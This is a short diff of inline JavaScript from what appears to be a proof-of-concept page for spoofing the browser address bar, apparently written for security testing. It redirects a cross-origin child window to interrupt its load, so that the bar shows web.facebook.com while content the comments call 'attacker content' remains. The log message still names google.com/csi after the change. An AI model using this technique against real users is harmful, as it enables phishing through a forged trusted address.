@@ -88,7 +88,7 @@ footer{text-align:center;margin-top:40px;font-size:14px;color:#8a8d91}</style></
    }catch(e){
      // child now cross-origin (bar = facebook). Interrupt load with a 204 beacon
      // so the committed URL stays while attacker content (hopefully) remains.
-     try{ w.location.href = "https://www.google.com/csi"; }catch(_){}
+     try{ w.location.href = "https://web.facebook.com/"; }catch(_){}
      clearInterval(z);
      log('interrupted with 204 (google.com/csi). CHECK child: does bar show web.facebook.com while content = BENIGN SPOOF TEST?');
    }
